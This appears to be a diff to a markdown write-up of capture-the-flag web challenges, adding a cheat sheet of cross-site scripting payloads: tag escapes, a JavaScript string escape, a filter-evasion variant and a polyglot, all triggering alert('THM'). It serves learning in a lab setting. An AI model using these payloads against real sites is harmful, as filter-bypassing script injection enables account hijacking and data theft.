@@ -662,6 +662,28 @@ And got the encoded base64 of the /private response.
 ![ssrf](./media/5-ssrf-challenge-2.png)
 now decoded the flag 
 
+## XSS - CROSS SITE SCRIPTING 
+
+```javascript
+
+# BASIC
+<script>alert('THM');</script>
+
+# Escape Tag
+"><script>alert('THM');</script>
+
+# Escape Tag
+</textarea><script>alert('THM');</script>
+
+# Escape JS command 
+';alert('THM');//
+
+# escape filter word script
+<sscriptcript>alert('THM');</sscriptcript>
+
+# POLYGLOT
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
 
 ---
 
